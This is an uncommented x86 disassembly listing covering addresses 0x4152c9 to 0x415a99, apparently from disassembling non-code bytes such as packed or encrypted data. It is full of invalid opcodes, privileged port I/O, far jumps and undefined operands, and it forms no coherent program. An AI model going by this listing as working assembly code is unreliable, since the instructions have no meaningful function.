  4152c9:	jae    0x4152f3
  4152cb:	mov    ebx,DWORD PTR [esi*2-0x39c7ac78]
  4152d2:	xchg   al,bh
  4152d4:	ss xor eax,0x1b2c399e
  4152da:	sub    ah,dl
  4152dc:	xchg   esi,eax
  4152dd:	in     al,dx
  4152de:	xor    ah,ah
  4152e0:	jle    0x4152be
  4152e2:	mov    ds:0x68ab0077,al
  4152e7:	cmp    bh,BYTE PTR [ebp-0x14fefdd]
  4152ed:	in     al,dx
  4152ee:	jne    0x4152f9
  4152f0:	mov    edx,eax
  4152f2:	mov    ebp,0x1aea9cac
  4152f7:	mov    esp,0x6b6fe68c
  4152fc:	xchg   DWORD PTR [edx+0x13],ecx
  4152ff:	mov    ds:0x8c316c68,eax
  415304:	jbe    0x41537f
  415306:	lods   al,BYTE PTR ds:[esi]
  415307:	ins    BYTE PTR es:[edi],dx
  415308:	stc    
  415309:	cmp    BYTE PTR [edi+0x1c],dh
  41530c:	pop    eax
  41530d:	clc    
  41530e:	mov    BYTE PTR [ecx+ebp*2+0x2102a97],0x43
  415316:	mov    dh,0x80
  415318:	aaa    
  415319:	retf   
  41531a:	mov    ch,0x1f
  41531c:	and    DWORD PTR [edi-0x626c04b9],ebp
  415322:	inc    ebx
  415323:	mov    ds:0x9c17b907,eax
  415328:	loope  0x41537d
  41532a:	adc    ecx,DWORD PTR [eax-0x1a]
  41532d:	bound  ebx,QWORD PTR gs:[esi]
  415330:	sbb    al,0xe8
  415332:	fist   WORD PTR [ebp+0x67]
  415335:	sub    eax,0xaad35ae4
  41533a:	xor    al,0x71
  41533c:	iret   
  41533d:	jne    0x4152f4
  41533f:	sahf   
  415340:	inc    ebp
  415341:	mov    ebp,?
  415343:	int    0xd5
  415345:	ret    0x2ae3
  415348:	aaa    
  415349:	dec    edi
  41534a:	adc    ebp,DWORD PTR [eax+0xe]
  41534d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41534e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41534f:	cld    
  415350:	mov    bl,0x6e
  415352:	pop    ecx
  415353:	fwait
  415354:	sbb    ebp,DWORD PTR [esi]
  415356:	test   ebx,0x8b3c13cf
  41535c:	(bad)  
  41535d:	jmp    FWORD PTR [ebx-0x46f58a0e]
  415363:	and    BYTE PTR [eax+0x60],dl
  415366:	test   al,0x1c
  415368:	pusha  
  415369:	xchg   ebp,eax
  41536a:	adc    eax,0x1e78f47
  41536f:	mov    eax,DWORD PTR [ebx]
  415371:	xor    ch,BYTE PTR [eax]
  415373:	popf   
  415374:	enter  0xa01d,0x84
  415378:	jbe    0x415366
  41537a:	inc    ebx
  41537b:	cmp    al,0x37
  41537d:	jge    0x415308
  41537f:	cwde   
  415380:	adc    BYTE PTR [ebx+0x16],al
  415383:	je     0x415351
  415385:	sub    cl,BYTE PTR [ebx]
  415387:	out    0xc,al
  415389:	xchg   esi,eax
  41538a:	adc    BYTE PTR [eax],cl
  41538c:	or     DWORD PTR [ebx-0x683a3723],ebp
  415392:	mov    esp,DWORD PTR [ebx-0x44e87d03]
  415398:	cmc    
  415399:	adc    dl,BYTE PTR [ebp+ebx*8+0x3c8af378]
  4153a0:	fcomip st,st(2)
  4153a2:	inc    edx
  4153a3:	ja     0x415407
  4153a5:	xchg   ebx,eax
  4153a6:	ja     0x415388
  4153a8:	fldcw  WORD PTR [eax-0xf]
  4153ab:	inc    DWORD PTR [edx]
  4153ad:	scas   al,BYTE PTR es:[edi]
  4153ae:	fwait
  4153af:	rcr    DWORD PTR [ebx-0x3d5cee39],cl
  4153b5:	sbb    edi,esp
  4153b7:	inc    ebx
  4153b9:	daa    
  4153ba:	push   ds
  4153bb:	pop    esp
  4153bc:	test   BYTE PTR [eax],0x73
  4153bf:	add    al,0xe1
  4153c1:	mov    ch,0xf1
  4153c3:	sub    cl,ah
  4153c5:	ds push ecx
  4153c7:	jecxz  0x415355
  4153c9:	inc    eax
  4153ca:	(bad)  
  4153cb:	cmp    DWORD PTR [ebx],ebx
  4153cd:	ret    0xcb2d
  4153d0:	jo     0x4153f3
  4153d2:	in     eax,dx
  4153d3:	imul   ecx,DWORD PTR [edi],0x59
  4153d6:	adc    BYTE PTR [ebx+esi*4+0x57],al
  4153da:	jle    0x4153c4
  4153dc:	pusha  
  4153dd:	mov    ebp,0x17f5a529
  4153e2:	xor    dl,al
  4153e4:	mov    cs,WORD PTR [edi-0x3]
  4153e7:	fimul  WORD PTR [ebx]
  4153e9:	mov    esp,0x25278c69
  4153ee:	ss pop edi
  4153f0:	cld    
  4153f1:	sub    eax,0xb986d5d7
  4153f6:	inc    esp
  4153f7:	retf   
  4153f8:	mov    ch,0x7b
  4153fa:	lods   eax,DWORD PTR ds:[esi]
  4153fb:	bound  edi,QWORD PTR fs:[eax-0x7d]
  4153ff:	in     eax,dx
  415400:	stos   BYTE PTR es:[edi],al
  415401:	retf   
  415402:	mov    edi,0x77a6404f
  415407:	addr16 jl 0x41539a
  41540a:	mov    DWORD PTR [eax+edx*8-0x5b1bb613],ebx
  415411:	retf   
  415412:	and    al,0x36
  415414:	(bad)  
  415415:	jbe    0x415470
  415417:	mov    ch,0x48
  415419:	push   ecx
  41541a:	outs   dx,BYTE PTR ds:[esi]
  41541b:	sbb    edx,ecx
  41541d:	mov    eax,ds:0x3bddec5d
  415422:	mov    cl,0x32
  415424:	push   esp
  415425:	stos   DWORD PTR es:[edi],eax
  415426:	inc    eax
  415427:	xchg   ebp,eax
  415428:	mov    ebp,DWORD PTR [edi]
  41542a:	(bad)  
  41542c:	and    al,0x33
  41542e:	xchg   ecx,eax
  41542f:	push   esi
  415430:	dec    edi
  415431:	pushf  
  415432:	daa    
  415433:	fistp  QWORD PTR [ebp+0xac99f3d]
  415439:	pusha  
  41543a:	lods   al,BYTE PTR ds:[esi]
  41543b:	fs pushf 
  41543d:	xchg   BYTE PTR [esp+ebx*2],dh
  415440:	jg     0x415430
  415442:	and    ebp,DWORD PTR [ecx-0x67402ee0]
  415448:	xchg   edi,eax
  415449:	sar    BYTE PTR [esi+0x506d7c4f],cl
  41544f:	jbe    0x415429
  415451:	aad    0xb6
  415453:	cmp    eax,0x6a7296fa
  415458:	mov    ecx,0x770805ed
  41545d:	dec    ecx
  41545e:	imul   esp,DWORD PTR [ebp-0x12],0x33
  415462:	rol    bl,cl
  415464:	nop
  415465:	stc    
  415466:	cmc    
  415467:	inc    esp
  415468:	pop    es
  415469:	add    DWORD PTR [edx+0xb],edx
  41546c:	xor    ecx,DWORD PTR [edx-0x6453a2c4]
  415472:	push   es
  415473:	in     al,dx
  415474:	div    BYTE PTR [ebx]
  415476:	mov    BYTE PTR [esi+0x7f011a73],bh
  41547c:	push   ecx
  41547d:	jge    0x415472
  41547f:	fwait
  415480:	mov    al,0x8d
  415482:	sub    DWORD PTR [edi+0x2fe2f50a],ebx
  415488:	aam    0x88
  41548a:	iret   
  41548b:	lods   al,BYTE PTR ds:[esi]
  41548c:	repz ror al,1
  41548f:	scas   eax,DWORD PTR es:[edi]
  415490:	fild   WORD PTR [ebp-0x31]
  415493:	(bad)  
  415495:	ins    DWORD PTR es:[edi],dx
  415496:	fstp   QWORD PTR [edi]
  415498:	adc    al,0x8f
  41549a:	(bad)  
  41549b:	sub    ebx,DWORD PTR [ecx]
  41549d:	xchg   edi,eax
  41549e:	xchg   ecx,eax
  41549f:	mov    ebp,0xb4f3512f
  4154a4:	mov    ch,0x6f
  4154a6:	fmul   DWORD PTR [edi-0x5d]
  4154a9:	dec    esi
  4154aa:	inc    edi
  4154ab:	inc    edi
  4154ac:	test   al,0xb0
  4154ae:	mov    al,0x6
  4154b0:	xchg   edx,eax
  4154b1:	stos   BYTE PTR es:[edi],al
  4154b2:	outs   dx,BYTE PTR ds:[esi]
  4154b3:	test   BYTE PTR [ebp+0x32],ah
  4154b6:	mov    al,ds:0xd14d5ceb
  4154bb:	or     dl,bh
  4154bd:	dec    eax
  4154be:	aam    0xc8
  4154c0:	inc    ebx
  4154c1:	jp     0x4154c3
  4154c3:	push   es
  4154c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4154c5:	push   edi
  4154c6:	jnp    0x4154dc
  4154c8:	add    DWORD PTR [esp+eax*4],ebx
  4154cb:	aas    
  4154cc:	scas   eax,DWORD PTR es:[edi]
  4154cd:	lea    eax,ds:[esi]
  4154d0:	shr    BYTE PTR [eax+0x4f],cl
  4154d3:	loopne 0x41548f
  4154d5:	add    eax,0xd91b9c2
  4154da:	add    DWORD PTR [ebp-0x4d],eax
  4154dd:	cmovb  edx,DWORD PTR [esi-0x7b]
  4154e1:	add    dl,BYTE PTR [ecx]
  4154e3:	jne    0x4154e6
  4154e5:	(bad)  
  4154e6:	int3   
  4154e7:	aad    0x79
  4154e9:	and    al,BYTE PTR [di-0x7b]
  4154ed:	stos   BYTE PTR es:[edi],al
  4154ee:	add    BYTE PTR [edx+0x23ff6966],al
  4154f4:	in     al,0x7
  4154f6:	push   ebx
  4154f7:	xor    ecx,DWORD PTR [edi]
  4154f9:	mov    cl,0x58
  4154fb:	xor    eax,0x1a3aeb9d
  415500:	repnz or DWORD PTR [ebx+0x1024e062],eax
  415507:	mov    ebp,DWORD PTR ds:[ebx+ecx*4+0x65]
  41550c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41550d:	pop    ebp
  41550e:	mov    ebx,0x56246ce4
  415513:	mov    al,BYTE PTR [esp+edi*8+0x7b19850b]
  41551a:	add    edi,edi
  41551c:	dec    eax
  41551d:	cmp    BYTE PTR [ecx],bh
  41551f:	push   edx
  415520:	xor    DWORD PTR [eax],edx
  415522:	xor    al,0x17
  415524:	jp     0x415541
  415526:	stc    
  415527:	xchg   ecx,eax
  415528:	shr    BYTE PTR [ebx+edx*1-0x238a54e3],1
  41552f:	mov    edi,0x3b217625
  415534:	pop    edx
  415535:	jp     0x415520
  415537:	bound  esp,QWORD PTR [ebx+edx*4+0x64327402]
  41553e:	pushf  
  41553f:	cs shl bh,cl
  415542:	inc    esi
  415543:	add    ebx,DWORD PTR [eax+esi*1+0x4b]
  415547:	scas   al,BYTE PTR es:[edi]
  415548:	fcmove st,st(7)
  41554a:	inc    ebp
  41554b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41554c:	fcmovne st,st(0)
  41554e:	sbb    al,0x91
  415550:	xchg   ecx,eax
  415551:	mov    eax,ds:0x1311ec7f
  415556:	fisttp WORD PTR [ebp+0x5e]
  415559:	xchg   edi,eax
  41555a:	fldcw  WORD PTR [ebx]
  41555c:	add    BYTE PTR [ecx+0x19],ah
  41555f:	mov    esp,0x8d527e47
  415564:	in     eax,0x96
  415566:	add    al,0xbb
  415568:	loope  0x41558d
  41556a:	into   
  41556b:	fcmovu st,st(3)
  41556d:	daa    
  41556e:	jae    0x415556
  415570:	add    BYTE PTR [ebx+0x14],bh
  415573:	adc    eax,0x896be1d2
  415578:	xchg   DWORD PTR [ebx],ebx
  41557a:	lds    esi,FWORD PTR ds:0x8d259458
  415580:	mov    esi,0x15613bf7
  415585:	pusha  
  415586:	ds add cl,bh
  415589:	leave  
  41558a:	test   al,0xd3
  41558c:	and    ch,al
  41558e:	dec    eax
  41558f:	sbb    cl,BYTE PTR [ebx+0x39691af2]
  415595:	in     eax,0xcb
  415597:	rol    edx,cl
  415599:	dec    edx
  41559a:	pusha  
  41559b:	jle    0x41559b
  41559d:	repnz push ecx
  41559f:	pop    ecx
  4155a0:	sbb    edx,DWORD PTR [ebx]
  4155a2:	test   DWORD PTR [eax],ebp
  4155a4:	push   cs
  4155a5:	les    esi,FWORD PTR [ebx]
  4155a7:	mov    eax,0xedc9f186
  4155ac:	jg     0x41552e
  4155ae:	gs test ecx,eax
  4155b1:	gs stos DWORD PTR es:[edi],eax
  4155b3:	mov    DWORD PTR [edi-0x6f0a00c2],ecx
  4155b9:	repnz out 0x9,al
  4155bc:	adc    ecx,DWORD PTR [eax-0x73]
  4155bf:	bound  ecx,QWORD PTR [edx]
  4155c1:	iret   
  4155c2:	add    ebp,DWORD PTR fs:[ecx+0x3a]
  4155c6:	cwde   
  4155c7:	adc    ah,BYTE PTR [eax]
  4155c9:	cwde   
  4155ca:	push   cs
  4155cb:	shl    ecx,1
  4155cd:	lods   al,BYTE PTR ds:[esi]
  4155ce:	cmc    
  4155cf:	test   al,0xeb
  4155d1:	push   edi
  4155d2:	shr    DWORD PTR [edx+0x78052e3b],1
  4155d8:	pusha  
  4155d9:	adc    BYTE PTR [edx],0x1e
  4155dc:	adc    bl,bl
  4155de:	mov    ds:0xa471f664,eax
  4155e3:	cmp    al,BYTE PTR [edx+0x6c]
  4155e6:	jnp    0x4155d6
  4155e8:	ds lahf 
  4155ea:	vpmadcsswd xmm11,xmm7,xmm7,xmm5
  4155f0:	sub    ah,BYTE PTR cs:[ebx]
  4155f3:	push   ds
  4155f4:	lahf   
  4155f5:	sahf   
  4155f6:	jno    0x4155a2
  4155f8:	jo     0x4155f0
  4155fa:	ficom  WORD PTR [esi+ebx*2]
  4155fd:	retf   0x1afa
  415600:	push   es
  415601:	imul   BYTE PTR [edi-0x38]
  415604:	push   esi
  415605:	push   ecx
  415606:	sub    bl,dl
  415608:	sbb    al,0x19
  41560a:	ins    DWORD PTR es:[edi],dx
  41560b:	loope  0x41564c
  41560d:	pop    ebx
  41560e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41560f:	test   eax,0x70bd6254
  415614:	push   edi
  415615:	enterw 0xfe46,0xd9
  41561a:	pop    ebp
  41561b:	sub    esi,DWORD PTR [ebx]
  41561d:	stos   DWORD PTR es:[edi],eax
  41561e:	(bad)  
  41561f:	shl    edi,1
  415621:	jo     0x415620
  415623:	and    ah,ah
  415625:	sub    BYTE PTR [edx],0xbb
  415628:	aam    0x2c
  41562a:	imul   eax,DWORD PTR [ebp+0x36],0x1bcb2835
  415631:	dec    ebp
  415632:	retf   
  415633:	sbb    esp,ebx
  415635:	fdivrp st(0),st
  415637:	xchg   ebp,eax
  415638:	mov    WORD PTR ds:[edi-0x70],?
  41563c:	call   0x5126:0x96524ce6
  415643:	and    al,0x75
  415645:	int    0x67
  415647:	lock cmp ecx,DWORD PTR [edx]
  41564a:	jb     0x4156c5
  41564c:	cdq    
  41564d:	push   esi
  41564e:	dec    ebx
  41564f:	push   ds
  415650:	ins    BYTE PTR es:[edi],dx
  415651:	and    ecx,esi
  415653:	adc    al,0x12
  415655:	dec    eax
  415656:	xchg   ebp,eax
  415657:	popf   
  415658:	inc    ebp
  415659:	(bad)  
  41565a:	mov    ebp,0x4db73034
  41565f:	out    0xe6,al
  415661:	stc    
  415662:	jl     0x415649
  415664:	js     0x4156a4
  415666:	out    0xd2,eax
  415668:	adc    BYTE PTR [edx+0x2f],bl
  41566b:	fsub   QWORD PTR [edx+0x25]
  41566e:	les    ebx,FWORD PTR [ecx+0x3e1e4604]
  415674:	cmp    ecx,esi
  415676:	mov    dl,0xfd
  415678:	pop    esp
  415679:	aad    0xb1
  41567b:	aaa    
  41567c:	cli    
  41567d:	sar    DWORD PTR [edi],cl
  41567f:	pop    ss
  415680:	(bad)  
  415681:	push   0x26
  415683:	adc    eax,0x6ccc6c7f
  415688:	ins    BYTE PTR es:[edi],dx
  415689:	dec    eax
  41568a:	(bad)  
  41568b:	mov    bh,0xa6
  41568d:	fucomi st,st(4)
  41568f:	or     DWORD PTR [ecx*4-0x795cc3cf],esi
  415696:	dec    esi
  415697:	adc    DWORD PTR [esi-0x35],edx
  41569a:	jle    0x415686
  41569c:	lahf   
  41569d:	sub    edx,edi
  41569f:	aad    0xf7
  4156a1:	push   ebx
  4156a2:	popa   
  4156a3:	imul   ebx,ebx,0x903dae60
  4156a9:	jg     0x4156a6
  4156ab:	jns    0x4156cf
  4156ad:	mov    ds:0x2ac9518d,al
  4156b2:	call   0x84fc75fb
  4156b7:	cmp    ah,BYTE PTR [ebx+esi*2-0x80]
  4156bb:	or     dl,al
  4156bd:	adc    DWORD PTR [ebp-0x75def899],esp
  4156c3:	bound  ebp,QWORD PTR [eax+0x4e44d63]
  4156c9:	pop    esi
  4156ca:	sbb    BYTE PTR ds:0x8ab4c93f,al
  4156d0:	bound  ebp,QWORD PTR [ebp-0x3e84c1e0]
  4156d6:	(bad)  
  4156d7:	leave  
  4156d8:	jnp    0x415692
  4156da:	call   DWORD PTR [ecx+0xd2ea08f]
  4156e0:	gs gs xor ebx,edx
  4156e4:	or     DWORD PTR [eax+0x57],0xfffffff7
  4156e8:	pop    ds
  4156e9:	shr    DWORD PTR [edi],1
  4156eb:	inc    ebp
  4156ec:	and    eax,0xb0b86f21
  4156f1:	stos   DWORD PTR es:[edi],eax
  4156f2:	clc    
  4156f3:	inc    esi
  4156f4:	mov    ebx,0x2504c70c
  4156f9:	lahf   
  4156fa:	mov    bh,0xcb
  4156fc:	cmp    BYTE PTR [ecx-0x23],bl
  4156ff:	xor    ebp,DWORD PTR [eax-0x1679a038]
  415705:	push   esp
  415706:	call   0x964f:0x4d16eba8
  41570d:	pop    ds
  41570e:	adc    cl,bl
  415710:	pop    esi
  415711:	cli    
  415712:	jne    0x415789
  415714:	(bad)  
  415715:	cmc    
  415716:	pop    ecx
  415717:	jns    0x41575f
  415719:	push   0x9bec4fa
  41571e:	xor    al,0xa5
  415720:	xchg   al,al
  415722:	sar    dl,1
  415724:	cdq    
  415725:	cli    
  415726:	popf   
  415727:	mov    BYTE PTR [ecx+0x11bdb792],0x8
  41572e:	cld    
  41572f:	cmp    dl,bl
  415731:	test   eax,0xa6df2080
  415736:	cwde   
  415737:	(bad)  
  415739:	pop    ecx
  41573a:	out    dx,al
  41573b:	cmp    ecx,DWORD PTR [eax-0x3843439c]
  415741:	leave  
  415742:	int    0x9
  415744:	(bad)  
  415745:	xor    eax,0x32e65405
  41574a:	xor    BYTE PTR [ecx-0x27c55b55],ch
  415750:	mov    eax,ds:0xd9421ebc
  415755:	dec    esi
  415756:	jecxz  0x41576f
  415758:	mov    WORD PTR [ecx+0x69d02413],fs
  41575e:	mov    al,0x64
  415760:	push   cs
  415761:	call   0x7a57:0x9832aa9
  415768:	xlat   BYTE PTR ds:[ebx]
  415769:	outs   dx,DWORD PTR ds:[esi]
  41576a:	sbb    ebx,DWORD PTR [eax+0x68b2de13]
  415770:	inc    esp
  415771:	cli    
  415772:	daa    
  415773:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415774:	jmp    0xdc763731
  415779:	xor    esi,ebx
  41577b:	test   al,0x65
  41577d:	adc    BYTE PTR [esi],dh
  41577f:	jmp    0x73ea:0x9497ebdb
  415786:	dec    esp
  415787:	xor    edi,DWORD PTR [ebx+0x6d]
  41578a:	cmp    al,0x2f
  41578c:	addr16 gs push ebx
  41578f:	jmp    0x25edf01b
  415794:	mov    WORD PTR [ecx-0x31],gs
  415797:	adc    DWORD PTR [ecx-0x4e5a025c],0x233157c9
  4157a1:	and    edi,ebx
  4157a3:	jg     0x415814
  4157a5:	lock cmp cl,BYTE PTR [edi]
  4157a8:	enter  0x87ca,0xce
  4157ac:	retf   0xa6a8
  4157af:	ret    
  4157b0:	or     eax,0x88204230
  4157b5:	dec    ecx
  4157b6:	and    eax,0xb5355181
  4157bb:	test   al,0x24
  4157bd:	sub    DWORD PTR [ebp+0x46bce8b5],ebp
  4157c3:	aas    
  4157c4:	xlat   BYTE PTR ds:[ebx]
  4157c5:	adc    bl,cl
  4157c7:	jb     0x415783
  4157c9:	addr16 test eax,0x23654d9c
  4157cf:	es xor al,0xc3
  4157d2:	pop    ds
  4157d3:	fld    TBYTE PTR [ecx-0x538f5e9]
  4157d9:	rcl    BYTE PTR [ecx],0xf2
  4157dc:	ret    
  4157dd:	sti    
  4157de:	imul   esi,DWORD PTR [ecx],0x3d
  4157e1:	mov    ds:0x609962d0,eax
  4157e6:	adc    eax,0x4992d50d
  4157eb:	and    al,0xd0
  4157ed:	sti    
  4157ee:	xchg   ecx,eax
  4157ef:	push   ds
  4157f0:	adc    eax,0x8f1e61a4
  4157f5:	leave  
  4157f6:	pop    esi
  4157f7:	mov    edx,0x72fae493
  4157fc:	push   esi
  4157fd:	cli    
  4157fe:	je     0x4157ed
  415800:	ins    DWORD PTR es:[edi],dx
  415801:	lea    ebx,[esi+0x75238f36]
  415807:	dec    eax
  415808:	jmp    0xf2ae:0xef5c2035
  41580f:	ret    0x421a
  415812:	or     ebx,DWORD PTR [eax+0x5d]
  415815:	add    edi,DWORD PTR [ebx]
  415817:	fimul  WORD PTR [ecx]
  415819:	push   esp
  41581a:	pushf  
  41581b:	mov    esp,0xe4056368
  415820:	sbb    cx,WORD PTR [edi+0x6287051e]
  415827:	inc    edi
  415828:	mov    al,0x10
  41582a:	test   al,0xee
  41582c:	sub    DWORD PTR cs:[ebx+edi*2-0x3c],ecx
  415831:	in     eax,0x10
  415833:	aad    0xa6
  415835:	loope  0x41582c
  415837:	add    eax,0x34c80ff4
  41583c:	enter  0x7f15,0x53
  415840:	ja     0x4157f3
  415842:	and    eax,0x95aee1b4
  415847:	fsubr  QWORD PTR [ebx-0x35]
  41584a:	fist   DWORD PTR [eax-0x5f]
  41584d:	int    0x43
  41584f:	pop    ebp
  415850:	in     eax,0x3
  415852:	call   0x8520:0xedc5f3c3
  415859:	jl     0x41589a
  41585b:	and    eax,ebx
  41585d:	xor    esi,DWORD PTR [eax-0x68]
  415860:	es aaa 
  415862:	addr16 dec edx
  415864:	(bad)  
  415865:	xchg   edx,eax
  415866:	inc    edx
  415867:	cmp    DWORD PTR [ebx+0x3b],0x12
  41586b:	sub    BYTE PTR [esi-0x40],dl
  41586e:	sub    ebp,DWORD PTR [edx-0x5366e918]
  415874:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415875:	out    0x97,eax
  415877:	push   ebp
  415878:	jne    0x4157fb
  41587a:	in     al,0x7
  41587c:	xchg   edx,eax
  41587d:	add    DWORD PTR [ebx+edi*2],0xffffffca
  415881:	nop
  415882:	in     eax,0x46
  415884:	sbb    esp,DWORD PTR [edi]
  415886:	xor    ch,BYTE PTR [ebp-0xbd84bcf]
  41588c:	mov    edi,0x17dcce05
  415891:	repnz mov edi,0xcaff53e7
  415897:	dec    ebx
  415898:	stos   BYTE PTR es:[edi],al
  415899:	or     ch,ch
  41589b:	clc    
  41589c:	mov    cl,0xea
  41589e:	or     BYTE PTR [esi+0x1e422c61],bh
  4158a4:	mov    ebx,edx
  4158a6:	test   BYTE PTR [ebp+esi*8-0x5a],al
  4158aa:	cmp    DWORD PTR [bp-0x7772],esp
  4158af:	int    0xca
  4158b1:	fdiv   DWORD PTR [eax]
  4158b3:	ret    0xfd9b
  4158b6:	in     eax,0xe1
  4158b8:	test   BYTE PTR [edi+0x63],bl
  4158bb:	push   es
  4158bc:	dec    ebp
  4158bd:	mov    cl,al
  4158bf:	out    dx,al
  4158c0:	push   ss
  4158c1:	xor    eax,0xc0e5be79
  4158c6:	mov    esp,0x27b08799
  4158cb:	mov    esi,0xe4ff2aa9
  4158d0:	call   0xaece33ad
  4158d5:	gs ins BYTE PTR es:[edi],dx
  4158d7:	loop   0x415946
  4158d9:	cld    
  4158da:	stos   BYTE PTR es:[edi],al
  4158db:	cmp    ch,BYTE PTR [ecx+eiz*2]
  4158de:	add    BYTE PTR [esi],ah
  4158e0:	xor    al,0xff
  4158e2:	scas   eax,DWORD PTR es:[edi]
  4158e3:	push   esp
  4158e4:	inc    BYTE PTR [ecx-0x4c]
  4158e7:	mov    cl,0x57
  4158e9:	das    
  4158ea:	inc    ebp
  4158eb:	dec    ebp
  4158ec:	mov    ch,0x58
  4158ee:	pop    es
  4158ef:	pop    edi
  4158f0:	popf   
  4158f1:	mov    cl,0x5a
  4158f3:	hlt    
  4158f4:	cmp    dh,dl
  4158f6:	fs (bad) 
  4158f9:	add    BYTE PTR [edx+0x417a4517],0xa2
  415900:	sbb    BYTE PTR [eax+0x43a8368c],al
  415906:	xor    eax,0x87ed1e87
  41590b:	adc    DWORD PTR [ecx-0x73],edx
  41590e:	ins    BYTE PTR es:[edi],dx
  41590f:	jno    0x4158f4
  415911:	int    0x5a
  415913:	shrd   DWORD PTR [ebx+ebx*2-0x5e],edi,0x2a
  415919:	loope  0x4158ed
  41591b:	dec    esp
  41591c:	stos   DWORD PTR es:[edi],eax
  41591d:	retfw  0xc879
  415921:	in     eax,0xd1
  415923:	push   edx
  415924:	dec    ebp
  415925:	add    DWORD PTR [edi],esi
  415927:	push   cs
  415928:	cmp    eax,0xd8305344
  41592d:	xor    DWORD PTR [ecx+ebx*4],ebp
  415930:	test   DWORD PTR fs:0x63fcf666,esp
  415937:	inc    edx
  415938:	mov    dl,0x5e
  41593a:	punpckhbw mm2,QWORD PTR [ebp+0x56]
  41593e:	ins    DWORD PTR es:[edi],dx
  41593f:	in     eax,0x74
  415941:	iret   
  415942:	sub    al,0xee
  415944:	push   ebx
  415945:	hlt    
  415946:	and    DWORD PTR [edi-0x20],ebx
  415949:	add    eax,0x9f812bde
  41594e:	jmp    0x415995
  415950:	(bad)  
  415951:	out    0x7c,al
  415953:	mov    BYTE PTR [eax+edi*2+0x61],bl
  415957:	or     bh,ah
  415959:	sub    eax,0xcb24484e
  41595e:	or     eax,0x760a3bd2
  415963:	push   0x219835ac
  415968:	(bad)  
  415969:	jnp    0x41591f
  41596b:	mov    ebx,0x895c42c1
  415970:	fsubr  st(6),st
  415972:	cmp    eax,0x91e3bd89
  415977:	jp     0x4159f0
  415979:	add    dh,BYTE PTR [edx-0x52]
  41597c:	or     DWORD PTR [eax-0x3f],esi
  41597f:	push   ebp
  415980:	inc    ecx
  415981:	lods   al,BYTE PTR ds:[esi]
  415982:	inc    esi
  415983:	adc    ch,BYTE PTR [ebx+0x5e83d13a]
  415989:	adc    eax,0xe221b5c9
  41598e:	je     0x41591c
  415990:	gs and dh,dh
  415993:	sbb    ebp,ecx
  415995:	and    ebx,esi
  415997:	jg     0x415991
  415999:	push   esp
  41599a:	stos   BYTE PTR es:[edi],al
  41599b:	cmp    al,0x59
  41599d:	dec    ebx
  41599e:	in     al,0xb2
  4159a0:	mov    dl,0x2f
  4159a2:	xchg   ah,dl
  4159a4:	sbb    al,0x89
  4159a6:	adc    BYTE PTR [edx-0x45],bl
  4159a9:	jl     0x415961
  4159ab:	cmp    eax,0x2f5c60a2
  4159b0:	ja     0x415a11
  4159b2:	(bad)  
  4159b3:	loop   0x415a0c
  4159b5:	jge    0x415951
  4159b7:	arpl   sp,si
  4159b9:	out    dx,eax
  4159ba:	jno    0x4159fe
  4159bc:	out    0xdf,eax
  4159be:	loope  0x415a11
  4159c0:	ficom  DWORD PTR fs:[ebx]
  4159c3:	inc    ebp
  4159c4:	xor    dl,ch
  4159c6:	inc    ebx
  4159c7:	mov    al,ds:0x135f4864
  4159cc:	push   eax
  4159cd:	out    0xf8,eax
  4159cf:	adc    ch,BYTE PTR [edi-0x38]
  4159d2:	jp     0x4159a9
  4159d4:	(bad)  
  4159d5:	inc    eax
  4159d6:	in     al,0x33
  4159d8:	adc    al,0x34
  4159da:	jecxz  0x415a07
  4159dc:	cmp    al,0x7e
  4159de:	es dec ebx
  4159e0:	into   
  4159e1:	(bad)  
  4159e2:	iret   
  4159e3:	jge    0x4159aa
  4159e5:	inc    esi
  4159e6:	pop    edi
  4159e7:	jnp    0x4159d9
  4159e9:	sub    ebp,ebp
  4159eb:	jmp    0x4159fd
  4159ed:	clc    
  4159ee:	test   BYTE PTR [edx+0x40d89abc],al
  4159f4:	cmp    eax,DWORD PTR [ebx]
  4159f6:	push   ecx
  4159f7:	icebp  
  4159f8:	into   
  4159f9:	adc    bh,BYTE PTR [ebp-0x30]
  4159fc:	or     BYTE PTR [edi-0x7e],0x46
  415a00:	(bad)  
  415a01:	jne    0x415a81
  415a03:	sub    BYTE PTR ds:[ebx-0x25a76f3f],cl
  415a0a:	jmp    0x4296805
  415a0f:	mov    cs,WORD PTR [edi+0x2e490483]
  415a15:	adc    dh,BYTE PTR [edx-0x121b46b]
  415a1b:	or     eax,0x54e81128
  415a20:	mov    ds:0x20017ad3,eax
  415a25:	clc    
  415a26:	push   esi
  415a27:	das    
  415a28:	mov    ebx,DWORD PTR [ebx+esi*1-0x5a]
  415a2c:	pop    es
  415a2d:	rol    BYTE PTR [ecx],0x2b
  415a30:	inc    ecx
  415a31:	js     0x4159f2
  415a33:	test   eax,0x675e95f4
  415a38:	cmp    eax,eax
  415a3a:	sbb    BYTE PTR [ecx],al
  415a3c:	out    0xd0,al
  415a3e:	in     al,dx
  415a3f:	dec    eax
  415a40:	sub    al,0xc4
  415a42:	mov    bh,0xfe
  415a44:	in     al,0xbf
  415a46:	es mov edi,0x162b13a4
  415a4c:	loopne 0x4159fd
  415a4e:	push   esp
  415a4f:	dec    BYTE PTR cs:[edx+edi*2]
  415a53:	(bad)  
  415a55:	cmp    eax,0xa4a83b6b
  415a5a:	imul   ecx,ebx,0xcc35e08c
  415a60:	sbb    DWORD PTR [ebp+esi*4-0x231e8ecc],ebx
  415a67:	test   eax,0x6f6a8911
  415a6c:	push   esi
  415a6d:	push   cs
  415a6e:	sbb    bl,bl
  415a70:	mov    BYTE PTR [ecx],dh
  415a72:	out    0x2a,eax
  415a74:	cs mov eax,0x1a77a1eb
  415a7a:	sbb    eax,0x93734dd4
  415a7f:	push   esp
  415a80:	lods   al,BYTE PTR ds:[esi]
  415a81:	and    ebx,0x11
  415a84:	add    al,0x1b
  415a86:	neg    bh
  415a88:	out    0xc5,al
  415a8a:	sub    BYTE PTR [edx-0x12123c04],dh
  415a90:	dec    edx
  415a91:	out    0xf1,al
  415a93:	idiv   DWORD PTR [edx-0x277700c7]
  415a99:	xchg   ebx,eax
